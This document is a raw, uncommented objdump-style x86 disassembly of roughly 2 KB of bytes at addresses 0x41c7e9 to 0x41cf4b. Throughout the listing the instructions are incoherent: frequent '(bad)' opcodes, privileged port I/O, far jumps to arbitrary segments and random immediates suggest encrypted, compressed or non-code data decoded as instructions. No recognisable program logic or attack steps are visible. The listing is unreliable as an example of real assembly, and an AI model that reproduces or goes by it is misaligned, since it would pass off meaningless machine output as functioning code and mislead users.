  41c7e9:	call   0x6a5e:0x638cec00
  41c7f0:	aam    0xca
  41c7f2:	pusha  
  41c7f3:	cld    
  41c7f4:	jo     0x41c78a
  41c7f6:	push   cs
  41c7f7:	and    eax,0xe52c9b6f
  41c7fc:	into   
  41c7fd:	dec    ebp
  41c7fe:	cmp    al,0xef
  41c800:	imul   eax,DWORD PTR [ebx+esi*4-0x3c],0xffffffc2
  41c805:	fadd   QWORD PTR [ecx-0x61]
  41c808:	test   DWORD PTR [ecx+ebx*1-0x21],ebp
  41c80c:	lock pop ecx
  41c80e:	jnp    0x41c842
  41c810:	imul   esp,DWORD PTR [eax+0x5d],0xffffffa5
  41c814:	sbb    al,0x56
  41c816:	cdq    
  41c817:	pop    esi
  41c818:	out    0xcd,al
  41c81a:	sub    esp,ebx
  41c81c:	leave  
  41c81d:	fsubp  st(5),st
  41c81f:	pop    edx
  41c820:	push   ds
  41c821:	sbb    DWORD PTR [esi-0x34191fc1],0xffffff8f
  41c828:	es scas eax,DWORD PTR es:[edi]
  41c82a:	test   eax,0x6fe25c0b
  41c82f:	sti    
  41c830:	jb     0x41c835
  41c832:	sar    BYTE PTR [edi-0x65fb07f4],0xab
  41c839:	pop    edx
  41c83a:	dec    esp
  41c83b:	mov    ebx,0xe7403922
  41c840:	xor    BYTE PTR [ebx+0x29],ch
  41c843:	inc    edi
  41c844:	sub    eax,0x7f4dce2d
  41c849:	outs   dx,BYTE PTR ds:[esi]
  41c84a:	jp     0x41c8ae
  41c84c:	mov    dh,0x89
  41c84e:	aas    
  41c84f:	sbb    eax,0xfb25c3df
  41c854:	(bad)  
  41c855:	xchg   esp,eax
  41c856:	imul   edi,DWORD PTR [ebp+0x2e068051],0xc59275b0
  41c860:	xor    dl,BYTE PTR [edi-0x4c11100d]
  41c866:	ficom  DWORD PTR [ebp+0x54]
  41c869:	(bad)  
  41c86a:	push   eax
  41c86b:	(bad)  
  41c86d:	fdiv   QWORD PTR [eax+edi*8-0x5f5d2785]
  41c874:	inc    edi
  41c875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c876:	xchg   ebp,eax
  41c877:	sub    BYTE PTR [ebp+ebx*2-0x2a67d159],bh
  41c87e:	jmp    0xc48e809a
  41c883:	lock mov ebp,0x9184c9ea
  41c889:	pop    ebp
  41c88a:	xor    edi,0x58980044
  41c890:	push   esi
  41c891:	jg     0x41c83c
  41c893:	ror    edx,0xdc
  41c896:	repnz aam 0xe8
  41c899:	push   edx
  41c89a:	jno    0x41c857
  41c89c:	jecxz  0x41c8cd
  41c89e:	outs   dx,BYTE PTR ds:[esi]
  41c89f:	(bad)  
  41c8a0:	pop    ds
  41c8a1:	pop    edx
  41c8a2:	push   0x11
  41c8a4:	dec    edi
  41c8a5:	stos   DWORD PTR es:[edi],eax
  41c8a6:	imul   esi,esi,0x49395b6b
  41c8ac:	dec    ebp
  41c8ad:	and    al,0x71
  41c8af:	repz dec edx
  41c8b1:	cmp    esp,0x653c35b9
  41c8b7:	dec    eax
  41c8b8:	xor    al,0x0
  41c8ba:	cmp    ecx,esi
  41c8bc:	stos   DWORD PTR es:[edi],eax
  41c8bd:	cmp    eax,0x14dce811
  41c8c2:	jb     0x41c8b2
  41c8c4:	sub    ch,dh
  41c8c6:	aas    
  41c8c7:	inc    ecx
  41c8c8:	iret   
  41c8c9:	lods   eax,DWORD PTR ds:[esi]
  41c8ca:	fcmovnb st,st(1)
  41c8cc:	(bad)  
  41c8cd:	cld    
  41c8ce:	icebp  
  41c8cf:	sti    
  41c8d0:	jno    0x41c8b6
  41c8d2:	ficomp WORD PTR [esi]
  41c8d4:	mov    esp,esi
  41c8d6:	inc    edi
  41c8d7:	dec    ecx
  41c8d8:	xlat   BYTE PTR ds:[ebx]
  41c8d9:	cdq    
  41c8da:	out    0x99,eax
  41c8dc:	mov    bh,0x67
  41c8de:	(bad)  
  41c8df:	mov    ebp,0xd0be057d
  41c8e4:	sub    BYTE PTR [edi],bl
  41c8e6:	or     BYTE PTR [ecx+0x6a],0x53
  41c8ea:	add    BYTE PTR [edi-0x53],bl
  41c8ed:	sub    cl,BYTE PTR [eax+0x4e54d880]
  41c8f3:	add    BYTE PTR [eax+0x33],0xb6
  41c8f7:	mov    eax,ds:0x9d34b2f3
  41c8fc:	cs pop esi
  41c8fe:	sub    eax,0xf445ab75
  41c903:	and    DWORD PTR [esi],edi
  41c905:	xor    BYTE PTR [esi+0x7fd596e9],cl
  41c90b:	lea    ebp,ds:0xce7c86dd
  41c911:	cmp    eax,0x4b9d4013
  41c916:	pop    ds
  41c917:	add    eax,0xf1697e1e
  41c91c:	and    eax,0x595955b6
  41c921:	mov    dl,0xc9
  41c923:	ror    BYTE PTR [ecx+0x7a95eb5f],1
  41c929:	icebp  
  41c92a:	outs   dx,DWORD PTR ds:[esi]
  41c92b:	mov    al,ds:0x115ad0e0
  41c930:	push   0x17045583
  41c935:	mov    ebx,ebp
  41c937:	or     al,0xa4
  41c939:	jge    0x41c8f6
  41c93b:	inc    edi
  41c93c:	div    eax
  41c93e:	jns    0x41c924
  41c940:	cmp    esp,eax
  41c942:	das    
  41c943:	xchg   DWORD PTR [edi-0x16],ebp
  41c946:	and    ch,BYTE PTR [ebx-0x752fae80]
  41c94c:	mov    edx,0xc25c02e9
  41c951:	imul   esp,DWORD PTR [ecx+0x3317bf7d],0x748194b6
  41c95b:	mov    ebx,0xf9305c2d
  41c960:	mov    ecx,0x3b5d0938
  41c965:	popf   
  41c966:	bound  edx,QWORD PTR [edx-0x4facb592]
  41c96c:	dec    edi
  41c96d:	sub    ebx,DWORD PTR [esi+0x0]
  41c970:	ret    
  41c971:	cwde   
  41c972:	fxch   st(4)
  41c974:	jns    0x41c962
  41c976:	ficomp WORD PTR ss:[edi]
  41c979:	and    DWORD PTR [ecx-0x2c],esp
  41c97c:	rol    BYTE PTR [ebx+0x28e51b5a],cl
  41c982:	mov    ebp,0xb80a141e
  41c987:	cmp    ecx,esp
  41c989:	dec    ebp
  41c98a:	jmp    0xce0dd16e
  41c98f:	cmc    
  41c990:	jle    0x41c9ef
  41c992:	mov    ds:0xee28052d,eax
  41c997:	sbb    eax,0x3f8ba358
  41c99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c99d:	mov    bl,0xde
  41c99f:	arpl   WORD PTR [esp+edx*2-0x293efb2f],bp
  41c9a6:	dec    edi
  41c9a7:	push   ebx
  41c9a8:	(bad)  
  41c9a9:	mov    esp,0xdb2f4a3e
  41c9ae:	add    al,0x82
  41c9b0:	push   0x1c
  41c9b2:	jl     0x41ca12
  41c9b4:	cmc    
  41c9b5:	cdq    
  41c9b6:	sahf   
  41c9b7:	in     al,0xf4
  41c9b9:	iret   
  41c9ba:	jge    0x41c9c1
  41c9bc:	js     0x41c9bb
  41c9be:	add    DWORD PTR [ebp-0x21eb7497],0xfffffff0
  41c9c5:	mov    ebp,?
  41c9c7:	call   0x1a668cab
  41c9cc:	pop    ecx
  41c9cd:	push   0xffffffef
  41c9cf:	jno    0x41c9c1
  41c9d1:	xchg   esp,eax
  41c9d2:	and    BYTE PTR [edi+0x601cbdb0],cl
  41c9d8:	xor    DWORD PTR [ebx-0x55a126cd],ebx
  41c9de:	push   ecx
  41c9df:	shl    DWORD PTR [ebp+0x4e],1
  41c9e2:	cmp    al,0x83
  41c9e4:	jo     0x41c9cb
  41c9e6:	lods   eax,DWORD PTR es:[esi]
  41c9e8:	pop    ebp
  41c9e9:	out    0x57,eax
  41c9eb:	push   ecx
  41c9ec:	mov    bh,0x1
  41c9ee:	loope  0x41c9a0
  41c9f0:	pop    ds
  41c9f1:	mov    ds:0x855c760a,al
  41c9f6:	xor    edx,DWORD PTR es:[ebx-0x20]
  41c9fa:	sub    eax,0xcb0738c4
  41c9ff:	nop
  41ca00:	xchg   edi,eax
  41ca01:	jmp    DWORD PTR [ecx]
  41ca03:	mov    eax,ds:0xc3b1112e
  41ca08:	std    
  41ca09:	mov    eax,ds:0xd972d942
  41ca0e:	inc    edi
  41ca0f:	inc    ebx
  41ca10:	push   ebp
  41ca11:	mov    edi,0xf1d9a03b
  41ca16:	cli    
  41ca17:	push   es
  41ca18:	repnz sub al,0xbd
  41ca1b:	and    cl,BYTE PTR [esi-0xc4267f4]
  41ca21:	aam    0x9a
  41ca23:	test   BYTE PTR gs:[ebx],al
  41ca26:	add    dh,BYTE PTR [eax-0x69]
  41ca29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca2a:	aaa    
  41ca2b:	inc    ebx
  41ca2c:	pop    ecx
  41ca2d:	mov    dl,0xe5
  41ca2f:	ds cdq 
  41ca31:	into   
  41ca32:	inc    ecx
  41ca33:	ret    
  41ca34:	jae    0x41ca90
  41ca36:	mov    edi,0x5e86f630
  41ca3b:	ds (bad) 
  41ca3d:	aas    
  41ca3e:	push   esp
  41ca3f:	sub    ebp,edi
  41ca41:	mov    esp,0xc8ba2f24
  41ca46:	and    dl,0x31
  41ca49:	cli    
  41ca4a:	inc    ebx
  41ca4b:	pop    ecx
  41ca4c:	or     eax,0x5a0580d9
  41ca51:	and    ch,BYTE PTR [edx-0x5c19657]
  41ca57:	dec    edi
  41ca58:	fldenv [edi-0x78]
  41ca5b:	pop    ds
  41ca5c:	imul   edi,ebp,0xffffff9b
  41ca5f:	add    al,dh
  41ca61:	fisub  DWORD PTR [edi+esi*8+0x1d]
  41ca65:	loop   0x41ca9b
  41ca67:	cmp    bl,ah
  41ca69:	pop    esp
  41ca6a:	pop    ds
  41ca6b:	in     eax,0x3a
  41ca6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca6e:	sar    BYTE PTR [edi-0x73dfaee0],cl
  41ca74:	xchg   edi,eax
  41ca75:	add    eax,0x4655930c
  41ca7a:	push   0x7f
  41ca7c:	hlt    
  41ca7d:	jns    0x41ca86
  41ca7f:	jno    0x41ca81
  41ca81:	rcr    BYTE PTR [ebp-0x6b575db],1
  41ca87:	and    al,0xc
  41ca89:	scas   eax,DWORD PTR es:[edi]
  41ca8a:	daa    
  41ca8b:	jne    0x41ca12
  41ca8d:	and    DWORD PTR [edx-0x26],0xfc2706bf
  41ca94:	xchg   DWORD PTR [edi+eax*4-0x370a2ed2],eax
  41ca9b:	cli    
  41ca9c:	loop   0x41caee
  41ca9e:	lea    esi,[ebp-0x55]
  41caa1:	bound  esi,QWORD PTR [eax]
  41caa3:	int    0xaa
  41caa5:	mov    ch,0x6d
  41caa7:	pop    ss
  41caa8:	cmps   WORD PTR gs:[esi],WORD PTR es:[edi]
  41caab:	add    bh,BYTE PTR [ebx]
  41caad:	jg     0x41caf1
  41caaf:	(bad)  
  41cab1:	mov    edi,0xa8058a28
  41cab6:	leave  
  41cab7:	pop    esi
  41cab8:	jl     0x41cb06
  41caba:	jmp    0xc1d55d82
  41cabf:	cmp    DWORD PTR [edx],ebx
  41cac1:	outs   dx,DWORD PTR ds:[esi]
  41cac2:	push   esi
  41cac3:	push   DWORD PTR [ebp-0x1fd71773]
  41cac9:	rcr    DWORD PTR [ebx-0x2d],cl
  41cacc:	inc    ebp
  41cacd:	dec    ebx
  41cace:	ins    DWORD PTR es:[edi],dx
  41cacf:	jae    0x41cb2a
  41cad1:	inc    ebp
  41cad2:	(bad)  
  41cad3:	jmp    0x5a367fe4
  41cad8:	aaa    
  41cad9:	xor    eax,0xa3b2f4a4
  41cade:	lahf   
  41cadf:	nop
  41cae0:	inc    edi
  41cae1:	out    0xf8,al
  41cae3:	shr    edx,1
  41cae5:	fsub   DWORD PTR es:[eax-0x28]
  41cae9:	imul   eax,DWORD PTR [edi-0x44],0x26
  41caed:	add    eax,0x21cb051d
  41caf2:	fwait
  41caf3:	inc    eax
  41caf4:	daa    
  41caf5:	mov    cl,0xc1
  41caf7:	dec    ebx
  41caf8:	fldenv [ebx-0x5d]
  41cafb:	call   DWORD PTR [eax-0x6f69ea7e]
  41cb01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb02:	in     eax,0xbf
  41cb04:	push   es
  41cb05:	mov    dh,BYTE PTR [ecx]
  41cb07:	out    0x60,al
  41cb09:	dec    edi
  41cb0a:	pop    esp
  41cb0b:	adc    BYTE PTR ds:0x87f08f2f,al
  41cb11:	inc    ebp
  41cb12:	fs hlt 
  41cb14:	and    DWORD PTR [ecx+0x27b53c26],0x49
  41cb1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb1c:	mov    edx,0xfb390207
  41cb21:	inc    edi
  41cb22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb23:	sbb    esp,DWORD PTR [ebx+0x9]
  41cb26:	jmp    DWORD PTR ss:[edx-0x5]
  41cb2a:	sub    bh,BYTE PTR gs:[ecx+0x27]
  41cb2e:	cmp    DWORD PTR [esi+esi*2],eax
  41cb31:	dec    eax
  41cb32:	xchg   edi,eax
  41cb33:	or     eax,0xee08cd7
  41cb38:	push   ds
  41cb39:	and    bh,ch
  41cb3b:	test   eax,0x470106a
  41cb40:	aad    0xf
  41cb42:	sub    eax,0x2af9189d
  41cb47:	push   0xffffff86
  41cb49:	mov    bh,0xf6
  41cb4b:	and    al,0x4c
  41cb4d:	cmp    BYTE PTR [eax+0x61090aca],dl
  41cb53:	dec    esi
  41cb54:	test   al,0x17
  41cb56:	inc    ecx
  41cb57:	mov    cl,0xf
  41cb59:	lock sbb ah,BYTE PTR [ecx+0x7c]
  41cb5d:	js     0x41cb37
  41cb5f:	inc    edi
  41cb60:	scas   al,BYTE PTR es:[edi]
  41cb61:	popf   
  41cb62:	jo     0x41cb4a
  41cb64:	push   ss
  41cb65:	add    al,0x41
  41cb67:	push   ecx
  41cb68:	add    al,0x8a
  41cb6a:	push   ecx
  41cb6b:	hlt    
  41cb6c:	enter  0x1470,0xcf
  41cb70:	mov    fs,eax
  41cb72:	add    DWORD PTR [ebx-0x2b639121],ebp
  41cb78:	ins    BYTE PTR es:[edi],dx
  41cb79:	or     al,0x9d
  41cb7b:	add    eax,0x67c7a7b3
  41cb80:	xchg   edx,eax
  41cb81:	and    dl,BYTE PTR [ebx-0x14]
  41cb84:	dec    ebp
  41cb85:	imul   ebx,DWORD PTR [esi],0xe98a9b83
  41cb8b:	mov    bl,BYTE PTR [esi-0x56]
  41cb8e:	inc    esi
  41cb8f:	dec    ecx
  41cb90:	(bad)  
  41cb92:	inc    ecx
  41cb93:	xlat   BYTE PTR ds:[ebx]
  41cb94:	ds xchg ebp,eax
  41cb96:	or     BYTE PTR [ebx+0x76220dca],ch
  41cb9c:	dec    ecx
  41cb9d:	push   ss
  41cb9e:	stos   DWORD PTR es:[edi],eax
  41cb9f:	inc    ebx
  41cba0:	mov    cl,0xbd
  41cba2:	inc    eax
  41cba3:	icebp  
  41cba4:	shl    DWORD PTR [esi-0x71],1
  41cba7:	outs   dx,DWORD PTR ds:[esi]
  41cba8:	push   edx
  41cba9:	and    bl,BYTE PTR [edx-0x32]
  41cbac:	repnz fsubr DWORD PTR [ebp+ebp*1-0x3f56f57]
  41cbb4:	xor    al,BYTE PTR ds:0x9a31df0a
  41cbba:	cvtdq2ps xmm3,XMMWORD PTR [ecx+0x3f]
  41cbbe:	imul   ebp,DWORD PTR [ebx+0x11f5ccfd],0xc8b8adeb
  41cbc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbc9:	pop    ebx
  41cbca:	sbb    BYTE PTR [edx-0x63],0x51
  41cbce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbcf:	fidiv  DWORD PTR [eax]
  41cbd1:	sub    al,0xb
  41cbd3:	sbb    al,0xf8
  41cbd5:	jl     0x41cbcb
  41cbd7:	inc    eax
  41cbd8:	fidiv  WORD PTR [edi+eiz*4+0x75]
  41cbdc:	inc    esi
  41cbdd:	or     bl,ah
  41cbdf:	stos   BYTE PTR es:[edi],al
  41cbe0:	shl    BYTE PTR [edi],cl
  41cbe2:	xchg   esp,eax
  41cbe3:	fcmovb st,st(7)
  41cbe5:	fwait
  41cbe6:	pop    esi
  41cbe7:	inc    edi
  41cbe8:	jl     0x41cb7c
  41cbea:	data16 and al,0x12
  41cbed:	jnp    0x41cc35
  41cbef:	rol    DWORD PTR [esi],1
  41cbf1:	inc    edx
  41cbf2:	add    al,0x27
  41cbf4:	push   eax
  41cbf5:	out    0x9d,eax
  41cbf7:	les    edx,FWORD PTR [edi]
  41cbf9:	jns    0x41cbef
  41cbfb:	scas   al,BYTE PTR es:[edi]
  41cbfc:	pop    ecx
  41cbfd:	aad    0x4b
  41cbff:	xchg   esi,eax
  41cc00:	jecxz  0x41cba1
  41cc02:	clc    
  41cc03:	inc    edx
  41cc04:	or     al,0xd9
  41cc06:	bswap  edi
  41cc08:	cld    
  41cc09:	sbb    esp,esi
  41cc0b:	xchg   esi,eax
  41cc0c:	xor    eax,0x20aad880
  41cc11:	dec    eax
  41cc12:	test   DWORD PTR [edi-0x63],edx
  41cc15:	pop    ebx
  41cc16:	and    eax,0x4a691183
  41cc1b:	dec    ecx
  41cc1c:	in     eax,dx
  41cc1d:	mov    edi,ecx
  41cc1f:	call   0xfd79ea19
  41cc24:	sbb    ah,BYTE PTR [edi-0x6f071a93]
  41cc2a:	xchg   esp,eax
  41cc2b:	jle    0x41cbc9
  41cc2d:	push   esi
  41cc2e:	out    0x25,al
  41cc30:	int    0x99
  41cc32:	mov    eax,0x3a4056cb
  41cc37:	nop
  41cc38:	push   edx
  41cc39:	cmc    
  41cc3a:	out    dx,eax
  41cc3b:	sbb    BYTE PTR [edi+0x1f],ah
  41cc3e:	jbe    0x41cc1c
  41cc40:	adc    DWORD PTR [esi+0x591256a6],edx
  41cc46:	sbb    cl,ch
  41cc48:	sbb    eax,0x62125640
  41cc4d:	sbb    BYTE PTR [edi-0x54],ch
  41cc50:	scas   eax,DWORD PTR es:[edi]
  41cc51:	push   DWORD PTR [ebx-0x315e1dd0]
  41cc57:	dec    ebp
  41cc58:	xchg   esi,eax
  41cc59:	jae    0x41cc73
  41cc5b:	inc    esi
  41cc5c:	or     al,0xf2
  41cc5e:	push   cs
  41cc5f:	jbe    0x41cc3e
  41cc61:	mov    ebx,0x5e88c292
  41cc66:	pop    eax
  41cc67:	or     BYTE PTR [ebx],ch
  41cc69:	sub    DWORD PTR [ebx+edx*2],eax
  41cc6c:	xor    eax,0xb96ace5c
  41cc71:	jne    0x41cc0c
  41cc73:	sbb    dl,al
  41cc75:	mov    bx,0xa0b6
  41cc79:	push   esp
  41cc7a:	and    dh,cl
  41cc7c:	mov    ch,0x99
  41cc7e:	mov    dh,0x1d
  41cc80:	jp     0x41cce9
  41cc82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc83:	retf   0xc9d3
  41cc86:	mov    dl,0xef
  41cc88:	push   ebp
  41cc89:	and    eax,0xe699154e
  41cc8e:	stos   DWORD PTR es:[edi],eax
  41cc8f:	jae    0x41cc3c
  41cc91:	sbb    eax,0x538d1706
  41cc96:	push   ds
  41cc97:	add    edi,DWORD PTR ss:[eax+0x74]
  41cc9b:	push   esp
  41cc9c:	xchg   ecx,eax
  41cc9d:	sbb    al,0x2
  41cc9f:	sub    ah,ah
  41cca1:	push   esi
  41cca2:	mov    bl,0xb7
  41cca4:	cdq    
  41cca5:	cmp    DWORD PTR [ebx],0x18
  41cca8:	inc    ecx
  41cca9:	sub    DWORD PTR [eax],eax
  41ccab:	es imul edi,ebp,0xbd43e2d9
  41ccb2:	sub    BYTE PTR [ecx+0x7fe465cf],bh
  41ccb8:	xor    DWORD PTR [esi],eax
  41ccba:	mov    dh,0x61
  41ccbc:	imul   edx,DWORD PTR [ebp+0x6363206],0xffffffe0
  41ccc3:	pop    esp
  41ccc4:	imul   edx,ebp,0xcc84c9f9
  41ccca:	xchg   ebx,eax
  41cccb:	fstp   DWORD PTR [ecx-0x2d]
  41ccce:	add    DWORD PTR [esi-0x8217484],eax
  41ccd4:	cmp    eax,0x9931c825
  41ccd9:	aam    0x9d
  41ccdb:	lock test BYTE PTR [ebp+0x71a20f2d],dl
  41cce2:	mov    bh,0x7f
  41cce4:	retf   0x5c3
  41cce7:	out    dx,al
  41cce8:	int    0xd7
  41ccea:	cmp    BYTE PTR [esp+edi*4],cl
  41cced:	enter  0x7860,0xfe
  41ccf1:	loope  0x41cca8
  41ccf3:	cmp    esi,DWORD PTR [esi]
  41ccf5:	pop    ds
  41ccf6:	dec    ebx
  41ccf7:	dec    ebp
  41ccf8:	ins    BYTE PTR es:[edi],dx
  41ccf9:	mov    bl,0x69
  41ccfb:	ja     0x41cce1
  41ccfd:	pop    ss
  41ccfe:	aad    0x98
  41cd00:	cwde   
  41cd01:	test   al,0xff
  41cd03:	push   es
  41cd04:	mov    ch,0xff
  41cd06:	dec    esp
  41cd07:	(bad)  
  41cd08:	and    dh,BYTE PTR [edx+0x26]
  41cd0b:	add    al,0x9c
  41cd0d:	leave  
  41cd0e:	leave  
  41cd0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd10:	test   DWORD PTR fs:[ebp+0x7f66cf2c],ebp
  41cd17:	ds push edi
  41cd19:	(bad)  
  41cd1b:	xchg   ecx,eax
  41cd1c:	mov    bh,0x1c
  41cd1e:	sub    eax,0x1d8c4ccb
  41cd23:	pop    ds
  41cd24:	pop    esi
  41cd25:	fcom   QWORD PTR [esi+eiz*8-0x78]
  41cd29:	retf   
  41cd2a:	jecxz  0x41cd49
  41cd2c:	mov    ds:0x8588d061,al
  41cd31:	mov    al,ds:0x25920b58
  41cd36:	retf   0x943f
  41cd39:	or     DWORD PTR [eax-0x1e],ebp
  41cd3c:	bound  eax,QWORD PTR [esi+esi*2]
  41cd3f:	mov    DWORD PTR [ebx-0x45],ecx
  41cd42:	and    BYTE PTR [ebp-0x67],ah
  41cd45:	dec    esi
  41cd46:	outs   dx,BYTE PTR ds:[esi]
  41cd47:	in     eax,dx
  41cd48:	jae    0x41cd7b
  41cd4a:	cld    
  41cd4b:	mov    WORD PTR ds:0x2878e4b6,?
  41cd51:	ret    0x4984
  41cd54:	fwait
  41cd55:	mov    cl,0x8e
  41cd57:	add    eax,0xf218528f
  41cd5c:	fs mov al,0x56
  41cd5f:	lds    esi,FWORD PTR [ebp+0x16932f64]
  41cd65:	dec    edi
  41cd66:	test   bl,ch
  41cd68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd69:	pop    ebp
  41cd6a:	or     ebx,ecx
  41cd6c:	fild   WORD PTR ss:[ecx-0x2e2b06]
  41cd73:	sbb    al,0xb5
  41cd75:	(bad)
  41cd79:	sbb    DWORD PTR [edx+eax*1-0x7f48c18d],0xed1b3a5c
  41cd84:	retf   
  41cd85:	adc    BYTE PTR [ecx],dh
  41cd87:	std    
  41cd88:	fiadd  DWORD PTR [edx-0xb71c1e1]
  41cd8e:	imul   eax,DWORD PTR [edx],0x12
  41cd91:	adc    dl,0x9f
  41cd94:	lahf   
  41cd95:	lods   eax,DWORD PTR ds:[esi]
  41cd96:	icebp  
  41cd97:	je     0x41cd99
  41cd99:	or     ebx,0xfffffff3
  41cd9c:	std    
  41cd9d:	lock xchg ebp,eax
  41cd9f:	mov    ebp,ebx
  41cda1:	pop    eax
  41cda2:	loop   0x41cdda
  41cda4:	fdiv   QWORD PTR [eax+0x22030b33]
  41cdaa:	jno    0x41cd94
  41cdac:	pop    ebp
  41cdad:	cmp    eax,0x81c1b976
  41cdb2:	adc    DWORD PTR [eax+esi*4],ebp
  41cdb5:	push   esi
  41cdb6:	fild   WORD PTR [esi+0x6e20258e]
  41cdbc:	cdq    
  41cdbd:	cmp    eax,0x4c19cf44
  41cdc2:	inc    edx
  41cdc3:	sub    al,0x90
  41cdc5:	jmp    0x6f11:0x43e81320
  41cdcc:	fld    st(5)
  41cdce:	mov    ch,0xec
  41cdd0:	in     al,0xf2
  41cdd2:	pop    eax
  41cdd3:	inc    eax
  41cdd4:	mov    ds:0x90f91667,eax
  41cdd9:	or     eax,0x69a5bcb9
  41cdde:	inc    esp
  41cddf:	dec    esp
  41cde0:	js     0x41cd8b
  41cde2:	push   ebp
  41cde3:	pushf  
  41cde4:	retf   0xd38d
  41cde7:	push   es
  41cde8:	aas    
  41cde9:	mov    ch,0xbe
  41cdeb:	gs retf 
  41cded:	ret    0x4004
  41cdf0:	jmp    0xd8fd31c3
  41cdf5:	sub    BYTE PTR [ebp-0x5a],dh
  41cdf8:	sbb    eax,DWORD PTR [edx]
  41cdfa:	dec    edx
  41cdfb:	jo     0x41cdf5
  41cdfd:	inc    ebx
  41cdfe:	cmp    DWORD PTR [ebx],edi
  41ce00:	int    0x7
  41ce02:	mov    edx,0xdd165b8a
  41ce07:	jne    0x41cde2
  41ce09:	out    0xd6,al
  41ce0b:	sub    eax,0xe3ba5589
  41ce10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce11:	das    
  41ce12:	pop    esp
  41ce13:	mov    ds:0x3a796fe4,al
  41ce18:	pusha  
  41ce19:	jbe    0x41cd9f
  41ce1b:	push   edi
  41ce1c:	push   ecx
  41ce1d:	jbe    0x41cdcb
  41ce1f:	cmc    
  41ce20:	in     al,dx
  41ce21:	mov    edi,0x2aec0a25
  41ce26:	cli    
  41ce27:	push   esi
  41ce28:	addr16 gs in al,dx
  41ce2b:	outs   dx,DWORD PTR ss:[esi]
  41ce2d:	xor    eax,0x81f2aa56
  41ce32:	test   BYTE PTR [ecx-0x7b],cl
  41ce35:	in     eax,0xa1
  41ce37:	ins    BYTE PTR es:[edi],dx
  41ce38:	dec    esi
  41ce39:	pop    eax
  41ce3a:	push   esp
  41ce3b:	fsub   st(5),st
  41ce3d:	test   eax,0x8c4a3ff6
  41ce42:	mov    eax,DWORD PTR ds:0xd9295950
  41ce48:	fsubr  QWORD PTR [edi-0x17e5531]
  41ce4e:	mov    ds:0x85f6aace,eax
  41ce53:	push   ds
  41ce54:	mov    ah,BYTE PTR [bx+si+0x3e3d]
  41ce59:	cmp    BYTE PTR [edi-0x72],0x6e
  41ce5d:	push   edi
  41ce5e:	dec    ebx
  41ce5f:	push   ds
  41ce60:	cld    
  41ce61:	(bad)  
  41ce62:	mov    edi,0x3f9a1972
  41ce67:	xchg   edx,eax
  41ce68:	sub    eax,0x1e5a6372
  41ce6d:	mov    bh,0x2f
  41ce6f:	or     dl,cl
  41ce71:	stc    
  41ce72:	jb     0x41ce52
  41ce74:	out    dx,eax
  41ce75:	test   DWORD PTR [eax+ebx*4+0x5e],eax
  41ce79:	jae    0x41cedd
  41ce7b:	js     0x41ceea
  41ce7d:	or     bh,dh
  41ce7f:	frstor [esp+eax*8-0x17]
  41ce83:	xor    eax,0xd9df021a
  41ce88:	mov    al,ds:0x6c690238
  41ce8d:	sti    
  41ce8e:	mov    ecx,0xc6ca34f7
  41ce93:	cmp    DWORD PTR [esi],ecx
  41ce95:	cmp    al,0x47
  41ce97:	jmp    0x3cac:0x8e46c575
  41ce9e:	sub    DWORD PTR [edi-0x6b],0x3d1cd022
  41cea5:	aaa    
  41cea6:	add    bh,ah
  41cea8:	pop    ebx
  41cea9:	inc    ecx
  41ceaa:	inc    ecx
  41ceab:	lods   eax,DWORD PTR ds:[esi]
  41ceac:	loopne 0x41ce8f
  41ceae:	into   
  41ceaf:	mov    al,ds:0x903377db
  41ceb4:	jle    0x41ce88
  41ceb6:	adc    DWORD PTR [edi],0x4b
  41ceb9:	aam    0xcc
  41cebb:	xor    eax,0xf99155c1
  41cec0:	push   edx
  41cec1:	imul   WORD PTR ds:0x1b2792c
  41cec8:	xchg   ch,bh
  41ceca:	mov    edi,0x6568fe89
  41cecf:	push   0x71
  41ced1:	sub    ecx,DWORD PTR [eax-0x66]
  41ced4:	inc    edx
  41ced5:	shl    BYTE PTR [edx-0x30],cl
  41ced8:	mov    eax,ds:0x14c1e7fa
  41cedd:	pop    ss
  41cede:	out    0x88,eax
  41cee0:	dec    esi
  41cee1:	push   ebp
  41cee2:	mov    edi,0x32d9b459
  41cee7:	add    BYTE PTR [edx],0x55
  41ceea:	iret   
  41ceeb:	or     cl,dl
  41ceed:	sub    BYTE PTR [eax+0x6b35ac83],bh
  41cef3:	pop    es
  41cef4:	jo     0x41cef4
  41cef6:	mov    ds:0xe2c8fae5,eax
  41cefb:	ins    BYTE PTR es:[edi],dx
  41cefc:	xor    DWORD PTR es:[esi-0xc0c10bc],esi
  41cf03:	aas    
  41cf04:	in     eax,dx
  41cf05:	out    0x19,eax
  41cf07:	ds fnsetpm(287 only) 
  41cf0a:	les    esp,FWORD PTR [ebx]
  41cf0c:	add    al,0x44
  41cf0e:	iret   
  41cf0f:	dec    edi
  41cf10:	mov    esp,0x24e8d544
  41cf15:	inc    edx
  41cf16:	cmp    BYTE PTR [bp+si+0x68],0x2f
  41cf1b:	mov    edx,0xc97e6951
  41cf20:	and    dl,BYTE PTR [ebx-0xc]
  41cf23:	loope  0x41cecc
  41cf25:	ficom  WORD PTR [eax+0x6a746ed4]
  41cf2b:	jg     0x41cf57
  41cf2d:	adc    BYTE PTR [esi-0x35],0x45
  41cf31:	inc    edx
  41cf32:	daa    
  41cf33:	sub    DWORD PTR [esp+edi*2],0xffffffc1
  41cf37:	xor    cl,BYTE PTR [esp+esi*8+0x53]
  41cf3b:	pop    ebp
  41cf3c:	fidivr DWORD PTR [eax]
  41cf3e:	addr16 cmp ch,dh
  41cf41:	scas   eax,DWORD PTR es:[edi]
  41cf42:	jo     0x41cf95
  41cf44:	xchg   edx,eax
  41cf45:	inc    esp
  41cf46:	pop    ds
  41cf47:	out    dx,al
  41cf48:	push   edx
  41cf49:	inc    esi
  41cf4a:	inc    edx
  41cf4b:	je     0x41cef7
